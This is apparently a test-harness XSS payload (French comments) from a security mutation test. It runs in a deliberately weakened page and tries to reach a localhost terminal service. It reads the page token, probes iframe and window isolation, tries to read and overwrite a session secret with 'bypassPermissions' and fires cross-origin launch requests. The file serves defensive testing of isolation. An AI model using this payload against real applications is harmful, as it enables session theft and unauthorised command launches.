// lancer-charge.js — la charge exécutée dans la page P COMPROMISE (Phase 72, plan 72-11 ; TERM-12 prolongée, LANC-04, LANC-07, LANC-09 ; P72-D-09 à P72-D-14).
// Hypothèse : l'échappement et la CSP de P sont retirés (mutants M-ESC et M-CSP), la charge s'exécute. Elle FAIT NAÎTRE une proposition (P a ce droit : POST /api/vf/lancer
// avec le jeton de la page), mesure l'isolement de Q (cadre, fenêtre, stockage, messages), attend le signal du pilote (window.__go : l'armement est passé), puis tente de CONFIRMER
// et d'ÉCRIRE (/lancer, /entree) vers Q. Constantes remplacées par la suite : __CIBLE__ (identifiant de la cible), __CLE_STOCK__ (clé de stockage de Q (le secret de session)), __ID1__, __ID2__ (identifiants devinés).
// Chaque tentative note « envoye » ou le nom de l'exception (X.<tentative>), la fin est X.fin = true. Aucune attente à durée fixe hors l'attente bornée du signal.
(async () => {
  const X = window.__xss = { debut: true };
  const att = (ms) => new Promise((r) => setTimeout(r, ms));
  const essai = async (cle, f) => { try { X[cle] = await f(); } catch (x) { X[cle] = x && x.name ? x.name : String(x); } };
  try {
    const tok = window.VF_COCKPIT_SERVER.token; X.jeton = !!tok;
    const H = { 'x-vf-cockpit-token': tok };
    const e = await (await fetch('/api/vf/terminal', { headers: H })).json();
    X.etat = e.etat; X.q = e.port; const Q = 'http://127.0.0.1:' + e.port;
    const c = await (await fetch('/api/vf/lancer/cibles', { headers: H })).json();
    const cible = (c.cibles || []).find((x) => x.id === '__CIBLE__'); X.cible = !!cible;
    const r = await fetch('/api/vf/lancer', { method: 'POST', headers: { ...H, 'content-type': 'application/json' }, body: JSON.stringify({ cible: '__CIBLE__', verbe: cible.principal }) });
    X.propose = r.status;
    const f = document.createElement('iframe'); f.src = Q + '/?theme=dark';
    await new Promise((ok) => { f.onload = ok; document.body.appendChild(f); setTimeout(ok, 8000); });
    await essai('clicCadre', () => { f.click(); return 'envoye'; });
    await essai('contenu', () => String(f.contentDocument));
    await essai('stockageLecture', () => { f.contentWindow.localStorage.getItem('__CLE_STOCK__'); return 'lisible'; });
    await essai('stockageEcriture', () => { f.contentWindow.localStorage.setItem('__CLE_STOCK__', 'bypassPermissions'); return 'inscrit'; });
    await essai('stockageP', () => { localStorage.setItem('vf.temoin', '1'); return localStorage.getItem('vf.temoin') === '1' ? 'lisible' : 'illisible'; });
    await essai('postMessage', () => {
      f.contentWindow.postMessage('toggle', '*'); f.contentWindow.postMessage('lancer', '*'); f.contentWindow.postMessage({ id: '__ID1__', mode: 'herite' }, '*'); return 'envoye';
    });
    const w = window.open(Q + '/', '_blank'); X.open = w ? 'ouvert' : 'bloque';
    if (w) { for (let i = 0; i < 80; i++) { try { w.localStorage.getItem('__CLE_STOCK__'); } catch (x) { break; } await att(100); } await essai('stockageFenetre', () => { w.localStorage.getItem('__CLE_STOCK__'); return 'lisible'; }); try { w.postMessage('lancer', '*'); } catch (x) { void x; } }
    X.etape1 = true;
    // signal du pilote : la proposition a été lue, l'armement est passé (attente bornée, 60 s)
    for (let i = 0; i < 600 && !window.__go; i++) await att(100);
    X.go = !!window.__go;
    for (const id of ['__ID1__', '__ID2__']) await essai('lancerNoCors' + (id === '__ID1__' ? '1' : '2'), async () => { await fetch(Q + '/lancer', { method: 'POST', mode: 'no-cors', body: JSON.stringify({ id, mode: 'herite' }) }); return 'envoye'; });
    await essai('lancerJeton', async () => { const x = await fetch(Q + '/lancer', { method: 'POST', headers: { 'X-VF-Terminal': tok, 'X-VF-Onglet': 'forge', 'Content-Type': 'application/json' }, body: JSON.stringify({ id: '__ID1__', mode: 'herite' }) }); return 'reponse ' + x.status; });
    await essai('proposition', async () => { const x = await fetch(Q + '/proposition', { headers: { 'X-VF-Terminal': tok } }); return 'reponse ' + x.status; });
    await essai('entree', async () => { await fetch(Q + '/entree', { method: 'POST', mode: 'no-cors', body: '\r' }); return 'envoye'; });
  } catch (x) { X.erreur = String((x && x.message) || x); }
  X.fin = true;
})()
